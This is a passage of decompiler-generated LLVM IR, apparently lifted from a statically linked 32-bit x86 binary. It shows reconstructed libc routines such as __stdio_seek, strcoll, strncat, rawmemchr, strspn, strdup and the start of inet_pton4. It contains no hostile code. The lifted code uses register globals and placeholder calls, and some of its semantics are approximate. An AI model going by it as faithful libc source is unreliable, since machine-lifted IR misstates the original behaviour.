  uselistorder label %dec_label_pc_8056cf8, { 1, 0 }
  uselistorder label %dec_label_pc_8056cb7, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8056d14 = add i32 %tmp5, 4
  %v2_8056d14 = inttoptr i32 %v1_8056d14 to i32*
  %v3_8056d14 = load i32, i32* %v2_8056d14, align 4
  %v2_8056d17 = load i32, i32* %arg2, align 4
  %v1_8056d1d = add i32 %arg1, 4
  %v2_8056d1d = inttoptr i32 %v1_8056d1d to i32*
  %v3_8056d1d = load i32, i32* %v2_8056d1d, align 4
  %v4_8056d20 = call i32 @__libc_lseek64(i32 %v3_8056d1d, i32 %v2_8056d17, i32 %v3_8056d14, i32 %arg3)
  %v0_8056d28 = load i32, i32* @edx, align 4
  %v2_8056d28 = icmp slt i32 %v0_8056d28, 0
  store i32 %v4_8056d20, i32* %ecx.global-to-local, align 4
  br i1 %v2_8056d28, label %dec_label_pc_8056d35, label %dec_label_pc_8056d2e

dec_label_pc_8056d2e:                             ; preds = %entry
  %v1_8056d2e = load i32, i32* @ebx, align 4
  %v2_8056d2e = inttoptr i32 %v1_8056d2e to i32*
  store i32 %v4_8056d20, i32* %v2_8056d2e, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_8056d32 = load i32, i32* @edx, align 4
  %v1_8056d32 = load i32, i32* @ebx, align 4
  %v2_8056d32 = add i32 %v1_8056d32, 4
  %v3_8056d32 = inttoptr i32 %v2_8056d32 to i32*
  store i32 %v0_8056d32, i32* %v3_8056d32, align 4
  %v0_8056d36.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8056d35

dec_label_pc_8056d35:                             ; preds = %entry, %dec_label_pc_8056d2e
  %v0_8056d36 = phi i32 [ %v4_8056d20, %entry ], [ %v0_8056d36.pre, %dec_label_pc_8056d2e ]
  ret i32 %v0_8056d36

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8056d35, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_8056d3e = ptrtoint i8* %arg1 to i32
  %v4_8056d46.pre = load i32, i32* @eax, align 4
  %v8_8056d46.pre = load i1, i1* @df, align 1
  %v9_8056d46 = select i1 %v8_8056d46.pre, i32 -1, i32 1
  br label %dec_label_pc_8056d46

dec_label_pc_8056d46:                             ; preds = %dec_label_pc_8056d4a, %entry
  %v20_8056d47 = phi i32 [ %v23_8056d47, %dec_label_pc_8056d4a ], [ %arg2, %entry ]
  %v4_8056d46 = phi i32 [ %v6_8056d46, %dec_label_pc_8056d4a ], [ %v4_8056d46.pre, %entry ]
  %v7_8056d46 = phi i32 [ %v10_8056d46, %dec_label_pc_8056d4a ], [ %v4_8056d3e, %entry ]
  %v1_8056d46 = inttoptr i32 %v7_8056d46 to i8*
  %v2_8056d46 = load i8, i8* %v1_8056d46, align 1
  %v3_8056d47 = inttoptr i32 %v20_8056d47 to i8*
  %v4_8056d47 = load i8, i8* %v3_8056d47, align 1
  %v15_8056d47 = icmp eq i8 %v2_8056d46, %v4_8056d47
  %v1_8056d48 = icmp eq i1 %v15_8056d47, false
  br i1 %v1_8056d48, label %dec_label_pc_8056d52, label %dec_label_pc_8056d4a

dec_label_pc_8056d4a:                             ; preds = %dec_label_pc_8056d46
  %v3_8056d46 = zext i8 %v2_8056d46 to i32
  %v5_8056d46 = and i32 %v4_8056d46, -256
  %v6_8056d46 = or i32 %v3_8056d46, %v5_8056d46
  %v23_8056d47 = add i32 %v20_8056d47, %v9_8056d46
  %v10_8056d46 = add i32 %v7_8056d46, %v9_8056d46
  %v4_8056d4a = icmp eq i8 %v2_8056d46, 0
  %v1_8056d4c = icmp eq i1 %v4_8056d4a, false
  br i1 %v1_8056d4c, label %dec_label_pc_8056d46, label %dec_label_pc_8056d56

dec_label_pc_8056d52:                             ; preds = %dec_label_pc_8056d46
  br label %dec_label_pc_8056d56

dec_label_pc_8056d56:                             ; preds = %dec_label_pc_8056d4a, %dec_label_pc_8056d52
  %storemerge = phi i32 [ 1, %dec_label_pc_8056d52 ], [ 0, %dec_label_pc_8056d4a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8056d46, { 1, 2, 0 }
  uselistorder i32 %v9_8056d46, { 1, 0 }
  uselistorder label %dec_label_pc_8056d56, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8056d5f = load i32, i32* @esi, align 4
  store i32 %v0_8056d5f, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_8056d63 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8056d63, i32* %esi.global-to-local, align 4
  %v4_8056d6b = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8056d6f = call i32 @_strlen(i8* %v4_8056d6b)
  %v2_8056d71 = add i32 %tmp, -1
  store i32 %v2_8056d71, i32* %edi.global-to-local, align 4
  %v8_8056d7513 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_8056d7513, label %dec_label_pc_8056d80, label %dec_label_pc_8056d78.lr.ph

dec_label_pc_8056d78.lr.ph:                       ; preds = %entry
  %v4_8056d78.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8056d78.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8056d78

dec_label_pc_8056d78:                             ; preds = %dec_label_pc_8056d78.lr.ph, %dec_label_pc_8056d78.dec_label_pc_8056d75_crit_edge
  %v8_8056d78 = phi i1 [ %v8_8056d78.pre, %dec_label_pc_8056d78.lr.ph ], [ %v5_8056d79, %dec_label_pc_8056d78.dec_label_pc_8056d75_crit_edge ]
  %v4_8056d78 = phi i32 [ %v4_8056d78.pre, %dec_label_pc_8056d78.lr.ph ], [ %v0_8056d7a, %dec_label_pc_8056d78.dec_label_pc_8056d75_crit_edge ]
  %v2_8056d8215 = phi i32 [ %v2_8056d71, %dec_label_pc_8056d78.lr.ph ], [ %v7_8056d79, %dec_label_pc_8056d78.dec_label_pc_8056d75_crit_edge ]
  %v0_8056d78 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056d78 = inttoptr i32 %v0_8056d78 to i8*
  %v2_8056d78 = load i8, i8* %v1_8056d78, align 1
  %v3_8056d78 = zext i8 %v2_8056d78 to i32
  %v5_8056d78 = and i32 %v4_8056d78, -256
  %v6_8056d78 = or i32 %v5_8056d78, %v3_8056d78
  store i32 %v6_8056d78, i32* %eax.global-to-local, align 4
  %v9_8056d78 = select i1 %v8_8056d78, i32 -1, i32 1
  %v10_8056d78 = add i32 %v9_8056d78, %v0_8056d78
  store i32 %v10_8056d78, i32* %esi.global-to-local, align 4
  %v3_8056d79 = inttoptr i32 %v2_8056d8215 to i8*
  store i8 %v2_8056d78, i8* %v3_8056d79, align 1
  %v4_8056d79 = load i32, i32* %edi.global-to-local, align 4
  %v5_8056d79 = load i1, i1* @df, align 1
  %v6_8056d79 = select i1 %v5_8056d79, i32 -1, i32 1
  %v7_8056d79 = add i32 %v6_8056d79, %v4_8056d79
  store i32 %v7_8056d79, i32* %edi.global-to-local, align 4
  %v0_8056d7a = load i32, i32* %eax.global-to-local, align 4
  %v3_8056d7a = trunc i32 %v0_8056d7a to i8
  %v4_8056d7a = icmp eq i8 %v3_8056d7a, 0
  %v1_8056d7c = icmp eq i1 %v4_8056d7a, false
  br i1 %v1_8056d7c, label %dec_label_pc_8056d78.dec_label_pc_8056d75_crit_edge, label %dec_label_pc_8056d83

dec_label_pc_8056d78.dec_label_pc_8056d75_crit_edge: ; preds = %dec_label_pc_8056d78
  %v0_8056d75.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056d75 = add i32 %v0_8056d75.pre, -1
  %v8_8056d75 = icmp eq i32 %v1_8056d75, 0
  store i32 %v1_8056d75, i32* %ecx.global-to-local, align 4
  br i1 %v8_8056d75, label %dec_label_pc_8056d80, label %dec_label_pc_8056d78

dec_label_pc_8056d80:                             ; preds = %dec_label_pc_8056d78.dec_label_pc_8056d75_crit_edge, %entry
  %v2_8056d82.lcssa = phi i32 [ %v2_8056d71, %entry ], [ %v7_8056d79, %dec_label_pc_8056d78.dec_label_pc_8056d75_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8056d82 = inttoptr i32 %v2_8056d82.lcssa to i8*
  store i8 0, i8* %v3_8056d82, align 1
  %v4_8056d82 = load i32, i32* %edi.global-to-local, align 4
  %v5_8056d82 = load i1, i1* @df, align 1
  %v6_8056d82 = select i1 %v5_8056d82, i32 -1, i32 1
  %v7_8056d82 = add i32 %v6_8056d82, %v4_8056d82
  store i32 %v7_8056d82, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056d83

dec_label_pc_8056d83:                             ; preds = %dec_label_pc_8056d78, %dec_label_pc_8056d80
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8056d87 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056d87, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8056d75, { 1, 0 }
  uselistorder i32 %v0_8056d7a, { 1, 0 }
  uselistorder i32 %v7_8056d79, { 0, 2, 1 }
  uselistorder i1 %v5_8056d79, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8056d83, { 1, 0 }
  uselistorder label %dec_label_pc_8056d78, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8056d8d = load i32, i32* @ebx, align 4
  %v4_8056d8e = urem i32 %arg2, 256
  %v4_8056d92 = ptrtoint i8* %arg1 to i32
  %v2_8056d9d3 = urem i32 %v4_8056d92, 4
  %v3_8056d9d4 = icmp eq i32 %v2_8056d9d3, 0
  %v1_8056d9f8 = icmp eq i1 %v3_8056d9d4, false
  %v4_8056d98 = trunc i32 %arg2 to i8
  br i1 %v1_8056d9f8, label %dec_label_pc_8056d98, label %dec_label_pc_8056da1

dec_label_pc_8056d98:                             ; preds = %entry, %dec_label_pc_8056d9c
  %v0_8056d9c = phi i32 [ %v1_8056d9c, %dec_label_pc_8056d9c ], [ %v4_8056d92, %entry ]
  %v1_8056d98 = inttoptr i32 %v0_8056d9c to i8*
  %v2_8056d98 = load i8, i8* %v1_8056d98, align 1
  %v15_8056d98 = icmp eq i8 %v2_8056d98, %v4_8056d98
  br i1 %v15_8056d98, label %dec_label_pc_8056dec, label %dec_label_pc_8056d9c

dec_label_pc_8056d9c:                             ; preds = %dec_label_pc_8056d98
  %v1_8056d9c = add i32 %v0_8056d9c, 1
  %v2_8056d9d = urem i32 %v1_8056d9c, 4
  %v3_8056d9d = icmp eq i32 %v2_8056d9d, 0
  %v1_8056d9f = icmp eq i1 %v3_8056d9d, false
  br i1 %v1_8056d9f, label %dec_label_pc_8056d98, label %dec_label_pc_8056da1

dec_label_pc_8056da1:                             ; preds = %entry, %dec_label_pc_8056d9c
  %v0_8056da4 = phi i32 [ %v1_8056d9c, %dec_label_pc_8056d9c ], [ %v4_8056d92, %entry ]
  %v2_8056da8 = mul nuw nsw i32 %v4_8056d8e, 256
  %v2_8056dab = or i32 %v2_8056da8, %v4_8056d8e
  %v2_8056daf = mul i32 %v2_8056dab, 65536
  %v2_8056db2 = or i32 %v2_8056daf, %v2_8056dab
  br label %dec_label_pc_8056db4

dec_label_pc_8056db4:                             ; preds = %dec_label_pc_8056de4, %dec_label_pc_8056db4, %dec_label_pc_8056da1
  %v0_8056db8 = phi i32 [ %v0_8056da4, %dec_label_pc_8056da1 ], [ %v1_8056db8, %dec_label_pc_8056db4 ], [ %v1_8056db8, %dec_label_pc_8056de4 ]
  %v2_8056db6 = inttoptr i32 %v0_8056db8 to i32*
  %v3_8056db6 = load i32, i32* %v2_8056db6, align 4
  %v4_8056db6 = xor i32 %v3_8056db6, %v2_8056db2
  %v1_8056db8 = add i32 %v0_8056db8, 4
  store i32 %v1_8056db8, i32* @ecx, align 4
  %v1_8056dbb = add i32 %v4_8056db6, 2130640639
  %v1_8056dc1 = sub i32 -1, %v4_8056db6
  store i32 %v1_8056dc1, i32* @edx, align 4
  %v2_8056dc3 = xor i32 %v1_8056dbb, %v1_8056dc1
  %v1_8056dc5 = and i32 %v2_8056dc3, -2130640640
  %v2_8056dc5 = icmp eq i32 %v1_8056dc5, 0
  br i1 %v2_8056dc5, label %dec_label_pc_8056db4, label %dec_label_pc_8056dcc

dec_label_pc_8056dcc:                             ; preds = %dec_label_pc_8056db4
  %v2_8056dcc = inttoptr i32 %v0_8056db8 to i8*
  %v3_8056dcc = load i8, i8* %v2_8056dcc, align 1
  %v16_8056dcc = icmp eq i8 %v3_8056dcc, %v4_8056d98
  br i1 %v16_8056dcc, label %dec_label_pc_8056dec, label %dec_label_pc_8056dd4

dec_label_pc_8056dd4:                             ; preds = %dec_label_pc_8056dcc
  %v1_8056dd4 = add i32 %v0_8056db8, 1
  %v2_8056dd4 = inttoptr i32 %v1_8056dd4 to i8*
  %v3_8056dd4 = load i8, i8* %v2_8056dd4, align 1
  %v16_8056dd4 = icmp eq i8 %v3_8056dd4, %v4_8056d98
  br i1 %v16_8056dd4, label %dec_label_pc_8056dec, label %dec_label_pc_8056ddc

dec_label_pc_8056ddc:                             ; preds = %dec_label_pc_8056dd4
  %v1_8056ddc = add i32 %v0_8056db8, 2
  %v2_8056ddc = inttoptr i32 %v1_8056ddc to i8*
  %v3_8056ddc = load i8, i8* %v2_8056ddc, align 1
  %v16_8056ddc = icmp eq i8 %v3_8056ddc, %v4_8056d98
  br i1 %v16_8056ddc, label %dec_label_pc_8056dec, label %dec_label_pc_8056de4

dec_label_pc_8056de4:                             ; preds = %dec_label_pc_8056ddc
  %v1_8056de4 = add i32 %v0_8056db8, 3
  %v2_8056de4 = inttoptr i32 %v1_8056de4 to i8*
  %v3_8056de4 = load i8, i8* %v2_8056de4, align 1
  %v16_8056de4 = icmp eq i8 %v3_8056de4, %v4_8056d98
  %v1_8056dea = icmp eq i1 %v16_8056de4, false
  br i1 %v1_8056dea, label %dec_label_pc_8056db4, label %dec_label_pc_8056dec

dec_label_pc_8056dec:                             ; preds = %dec_label_pc_8056d98, %dec_label_pc_8056de4, %dec_label_pc_8056ddc, %dec_label_pc_8056dd4, %dec_label_pc_8056dcc
  %v0_8056dee = phi i32 [ %v1_8056de4, %dec_label_pc_8056de4 ], [ %v1_8056ddc, %dec_label_pc_8056ddc ], [ %v1_8056dd4, %dec_label_pc_8056dd4 ], [ %v0_8056db8, %dec_label_pc_8056dcc ], [ %v0_8056d9c, %dec_label_pc_8056d98 ]
  store i32 %v0_8056d8d, i32* @ebx, align 4
  ret i32 %v0_8056dee

; uselistorder directives
  uselistorder i32 %v1_8056dc1, { 1, 0 }
  uselistorder i32 %v1_8056db8, { 2, 1, 0 }
  uselistorder i32 %v2_8056dab, { 1, 0 }
  uselistorder i32 %v1_8056d9c, { 1, 0, 2 }
  uselistorder i8 %v4_8056d98, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v4_8056d92, { 2, 1, 0 }
  uselistorder i32 %v4_8056d8e, { 1, 0 }
  uselistorder i32 -2130640640, { 1, 0 }
  uselistorder i32 2130640639, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8056dec, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8056da1, { 1, 0 }
  uselistorder label %dec_label_pc_8056d98, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_8056e1231 = load i8, i8* %arg1, align 1
  %v4_8056e1435 = icmp eq i8 %v2_8056e1231, 0
  br i1 %v4_8056e1435, label %dec_label_pc_8056e1c, label %dec_label_pc_8056e18.lr.ph

dec_label_pc_8056e18.lr.ph:                       ; preds = %entry
  %v3_8056e1232 = zext i8 %v2_8056e1231 to i32
  %v4_8056e12.pre = load i32, i32* @eax, align 4
  %v5_8056e1233 = and i32 %v4_8056e12.pre, -256
  %v6_8056e1234 = or i32 %v3_8056e1232, %v5_8056e1233
  %v4_8056df9 = ptrtoint i8* %arg1 to i32
  %v1_8056e0418 = inttoptr i32 %arg2 to i8*
  %v4_8056e04.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8056e18

dec_label_pc_8056dff:                             ; preds = %dec_label_pc_8056e18, %dec_label_pc_8056e03
  %v6_8056e0428 = phi i32 [ %v6_8056e04, %dec_label_pc_8056e03 ], [ %v6_8056e0422, %dec_label_pc_8056e18 ]
  %v2_8056e0427 = phi i8 [ %v2_8056e04, %dec_label_pc_8056e03 ], [ %v2_8056e0419, %dec_label_pc_8056e18 ]
  %v0_8056e0326 = phi i32 [ %v1_8056e03, %dec_label_pc_8056e03 ], [ %arg2, %dec_label_pc_8056e18 ]
  %v15_8056dff = icmp eq i8 %v2_8056e1239, %v2_8056e0427
  br i1 %v15_8056dff, label %dec_label_pc_8056e0c, label %dec_label_pc_8056e03

dec_label_pc_8056e03:                             ; preds = %dec_label_pc_8056dff
  %v1_8056e03 = add i32 %v0_8056e0326, 1
  store i32 %v1_8056e03, i32* @edx, align 4
  %v1_8056e04 = inttoptr i32 %v1_8056e03 to i8*
  %v2_8056e04 = load i8, i8* %v1_8056e04, align 1
  %v3_8056e04 = zext i8 %v2_8056e04 to i32
  %v5_8056e04 = and i32 %v6_8056e0428, -256
  %v6_8056e04 = or i32 %v3_8056e04, %v5_8056e04
  store i32 %v6_8056e04, i32* @ecx, align 4
  %v4_8056e06 = icmp eq i8 %v2_8056e04, 0
  %v1_8056e08 = icmp eq i1 %v4_8056e06, false
  br i1 %v1_8056e08, label %dec_label_pc_8056dff, label %dec_label_pc_8056e1c

dec_label_pc_8056e0c:                             ; preds = %dec_label_pc_8056dff
  %v1_8056e10 = add i32 %v0_8056e1d37, 1
  %v1_8056e11 = add i32 %v0_8056e1138, 1
  %v1_8056e12 = inttoptr i32 %v1_8056e11 to i8*
  %v2_8056e12 = load i8, i8* %v1_8056e12, align 1
  %v3_8056e12 = zext i8 %v2_8056e12 to i32
  %v5_8056e12 = and i32 %v6_8056e1240, -256
  %v6_8056e12 = or i32 %v3_8056e12, %v5_8056e12
  %v4_8056e14 = icmp eq i8 %v2_8056e12, 0
  br i1 %v4_8056e14, label %dec_label_pc_8056e1c, label %dec_label_pc_8056e18

dec_label_pc_8056e18:                             ; preds = %dec_label_pc_8056e18.lr.ph, %dec_label_pc_8056e0c
  %v4_8056e04.pre = phi i32 [ %v4_8056e04.pre.pre, %dec_label_pc_8056e18.lr.ph ], [ %v6_8056e0428, %dec_label_pc_8056e0c ]
  %v6_8056e1240 = phi i32 [ %v6_8056e1234, %dec_label_pc_8056e18.lr.ph ], [ %v6_8056e12, %dec_label_pc_8056e0c ]
  %v2_8056e1239 = phi i8 [ %v2_8056e1231, %dec_label_pc_8056e18.lr.ph ], [ %v2_8056e12, %dec_label_pc_8056e0c ]
  %v0_8056e1138 = phi i32 [ %v4_8056df9, %dec_label_pc_8056e18.lr.ph ], [ %v1_8056e11, %dec_label_pc_8056e0c ]
  %v0_8056e1d37 = phi i32 [ 0, %dec_label_pc_8056e18.lr.ph ], [ %v1_8056e10, %dec_label_pc_8056e0c ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8056e0419 = load i8, i8* %v1_8056e0418, align 1
  %v3_8056e0420 = zext i8 %v2_8056e0419 to i32
  %v5_8056e0421 = and i32 %v4_8056e04.pre, -256
  %v6_8056e0422 = or i32 %v3_8056e0420, %v5_8056e0421
  store i32 %v6_8056e0422, i32* @ecx, align 4
  %v4_8056e0623 = icmp eq i8 %v2_8056e0419, 0
  %v1_8056e0825 = icmp eq i1 %v4_8056e0623, false
  br i1 %v1_8056e0825, label %dec_label_pc_8056dff, label %dec_label_pc_8056e1c

dec_label_pc_8056e1c:                             ; preds = %entry, %dec_label_pc_8056e0c, %dec_label_pc_8056e18, %dec_label_pc_8056e03
  %v0_8056e1d17 = phi i32 [ %v0_8056e1d37, %dec_label_pc_8056e03 ], [ %v0_8056e1d37, %dec_label_pc_8056e18 ], [ 0, %entry ], [ %v1_8056e10, %dec_label_pc_8056e0c ]
  ret i32 %v0_8056e1d17

; uselistorder directives
  uselistorder i32 %v6_8056e0422, { 1, 0 }
  uselistorder i8 %v2_8056e0419, { 1, 2, 0 }
  uselistorder i32 %v1_8056e11, { 1, 0 }
  uselistorder i32 %v6_8056e04, { 1, 0 }
  uselistorder i8 %v2_8056e04, { 1, 2, 0 }
  uselistorder i32 %v1_8056e03, { 2, 1, 0 }
  uselistorder i8 %v2_8056e1231, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8056e1c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_8056e18, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8056e24 = load i32, i32* @edi, align 4
  %v0_8056e25 = load i32, i32* @esi, align 4
  %v0_8056e26 = load i32, i32* @ebx, align 4
  store i32 %v0_8056e26, i32* %stack_var_-12, align 4
  %v4_8056e27 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8056e27, i32* @edi, align 4
  %v3_8056e2f = call i32 @strlen(i8* %arg1)
  %v1_8056e34 = add i32 %v3_8056e2f, 1
  store i32 %v1_8056e34, i32* @esi, align 4
  %v2_8056e3a = call i32 @malloc(i32 %v1_8056e34)
  %v1_8056e42 = icmp eq i32 %v2_8056e3a, 0
  store i32 %v2_8056e3a, i32* %ebx.global-to-local, align 4
  br i1 %v1_8056e42, label %dec_label_pc_8056e54, label %dec_label_pc_8056e48

dec_label_pc_8056e48:                             ; preds = %entry
  %v0_8056e49 = load i32, i32* @esi, align 4
  %v0_8056e4a = load i32, i32* @edi, align 4
  %tmp11 = inttoptr i32 %v2_8056e3a to i16*
  %v6_8056e4c = call i32 @memcpy(i16* %tmp11, i32 %v0_8056e4a, i32 %v0_8056e49)
  %v0_8056e54.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056e54

dec_label_pc_8056e54:                             ; preds = %entry, %dec_label_pc_8056e48
  %v0_8056e54 = phi i32 [ 0, %entry ], [ %v0_8056e54.pre, %dec_label_pc_8056e48 ]
  %v2_8056e56 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8056e56, i32* @ebx, align 4
  store i32 %v0_8056e25, i32* @esi, align 4
  store i32 %v0_8056e24, i32* @edi, align 4
  ret i32 %v0_8056e54

; uselistorder directives
  uselistorder i32 %v2_8056e3a, { 0, 2, 1 }
  uselistorder i32 (i32)* @malloc, { 9, 6, 5, 17, 16, 15, 1, 8, 7, 14, 13, 12, 11, 10, 4, 3, 2, 0 }
  uselistorder label %dec_label_pc_8056e54, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 0, i32* @edx, align 4
  %v0_8056e62 = load i32, i32* @esi, align 4
  store i32 0, i32* @edi, align 4
  %v0_8056e65 = load i32, i32* @ebx, align 4
  store i32 %v0_8056e65, i32* %stack_var_-16, align 4
  %v0_8056e66 = load i32, i32* @eax, align 4
  store i32 %v0_8056e66, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8056e68 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8056e6b = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8056e6b, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_8056eb315 = inttoptr i32 %v0_8056e66 to i8*
  %v2_8056eb316 = load i8, i8* %v1_8056eb315, align 1
  %v3_8056eb317 = sext i8 %v2_8056eb316 to i32
  store i32 %v3_8056eb317, i32* @ecx, align 4
  %v1_8056eb618 = add i32 %v0_8056e66, 1
  store i32 %v1_8056eb618, i32* %ebx.global-to-local, align 4
  %v1_8056eb719 = icmp eq i8 %v2_8056eb316, 0
  store i1 %v1_8056eb719, i1* %zf.global-to-local, align 1
  %v1_8056eb921 = icmp eq i1 %v1_8056eb719, false
  br i1 %v1_8056eb921, label %dec_label_pc_8056e76, label %dec_label_pc_8056ebb

dec_label_pc_8056e76:                             ; preds = %entry, %dec_label_pc_8056eb3.backedge
  %v3_8056eb323 = phi i32 [ %v3_8056eb3, %dec_label_pc_8056eb3.backedge ], [ %v3_8056eb317, %entry ]
  %v2_8056eb322 = phi i8 [ %v2_8056eb3, %dec_label_pc_8056eb3.backedge ], [ %v2_8056eb316, %entry ]
  %v1_8056e76 = add nsw i32 %v3_8056eb323, -48
  store i32 %v1_8056e76, i32* @eax, align 4
  %v9_8056e79 = icmp eq i8 %v2_8056eb322, 57
  store i1 %v9_8056e79, i1* %zf.global-to-local, align 1
  %v6_8056e7c = icmp ugt i32 %v1_8056e76, 9
  br i1 %v6_8056e7c, label %dec_label_pc_8056e9f, label %dec_label_pc_8056e7e

dec_label_pc_8056e7e:                             ; preds = %dec_label_pc_8056e76
  %v0_8056e7e = load i32, i32* @esi, align 4
  %v1_8056e7e = inttoptr i32 %v0_8056e7e to i8*
  %v2_8056e7e = load i8, i8* %v1_8056e7e, align 1
  %v2_8056e81 = zext i8 %v2_8056e7e to i32
  %v3_8056e81 = mul nuw nsw i32 %v2_8056e81, 10
  %v3_8056e84 = add nsw i32 %v3_8056e81, %v1_8056e76
  store i32 %v3_8056e84, i32* @eax, align 4
  %v9_8056e88 = icmp eq i32 %v3_8056e84, 255
  store i1 %v9_8056e88, i1* %zf.global-to-local, align 1
  %v6_8056e8d = icmp ugt i32 %v3_8056e84, 255
  br i1 %v6_8056e8d, label %dec_label_pc_8056ed8, label %dec_label_pc_8056e8f

dec_label_pc_8056e8f:                             ; preds = %dec_label_pc_8056e7e
  %v0_8056e8f = load i32, i32* @edx, align 4
  %v1_8056e8f = icmp eq i32 %v0_8056e8f, 0
  store i1 %v1_8056e8f, i1* %zf.global-to-local, align 1
  %v1_8056e91 = trunc i32 %v3_8056e84 to i8
  store i8 %v1_8056e91, i8* %v1_8056e7e, align 1
  %v0_8056e93 = load i1, i1* %zf.global-to-local, align 1
  %v1_8056e93 = icmp eq i1 %v0_8056e93, false
  br i1 %v1_8056e93, label %dec_label_pc_8056eb3.backedge, label %dec_label_pc_8056e95

dec_label_pc_8056e95:                             ; preds = %dec_label_pc_8056e8f
  %v0_8056e95 = load i32, i32* @edi, align 4
  %v1_8056e95 = add i32 %v0_8056e95, 1
  store i32 %v1_8056e95, i32* @edi, align 4
  %v1_8056e96 = add i32 %v0_8056e95, -3
  %v6_8056e96 = sub i32 2, %v0_8056e95
  %v7_8056e96 = and i32 %v6_8056e96, %v1_8056e95
  %v8_8056e96 = icmp slt i32 %v7_8056e96, 0
  %v9_8056e96 = icmp eq i32 %v1_8056e96, 0
  store i1 %v9_8056e96, i1* %zf.global-to-local, align 1
  %v10_8056e96 = icmp slt i32 %v1_8056e96, 0
  %v3_8056e99 = icmp eq i1 %v10_8056e96, %v8_8056e96
  %v4_8056e99 = icmp eq i1 %v9_8056e96, false
  %v5_8056e99 = and i1 %v4_8056e99, %v3_8056e99
  br i1 %v5_8056e99, label %dec_label_pc_8056ed8, label %dec_label_pc_8056e9b

dec_label_pc_8056e9b:                             ; preds = %dec_label_pc_8056e95
  %v0_8056e9b = load i32, i32* @edx, align 4
  %v1_8056e9b = and i32 %v0_8056e9b, -256
  %v2_8056e9b = or i32 %v1_8056e9b, 1
  store i32 %v2_8056e9b, i32* @edx, align 4
  br label %dec_label_pc_8056eb3.backedge

dec_label_pc_8056e9f:                             ; preds = %dec_label_pc_8056e76
  %v9_8056e9f = icmp eq i8 %v2_8056eb322, 46
  store i1 %v9_8056e9f, i1* %zf.global-to-local, align 1
  %v1_8056ea2 = icmp eq i1 %v9_8056e9f, false
  br i1 %v1_8056ea2, label %dec_label_pc_8056ed8, label %dec_label_pc_8056ea4

dec_label_pc_8056ea4:                             ; preds = %dec_label_pc_8056e9f
  %v0_8056ea4 = load i32, i32* @edx, align 4
  %v1_8056ea4 = icmp eq i32 %v0_8056ea4, 0
  store i1 %v1_8056ea4, i1* %zf.global-to-local, align 1
  br i1 %v1_8056ea4, label %dec_label_pc_8056ed8, label %dec_label_pc_8056ea8

dec_label_pc_8056ea8:                             ; preds = %dec_label_pc_8056ea4
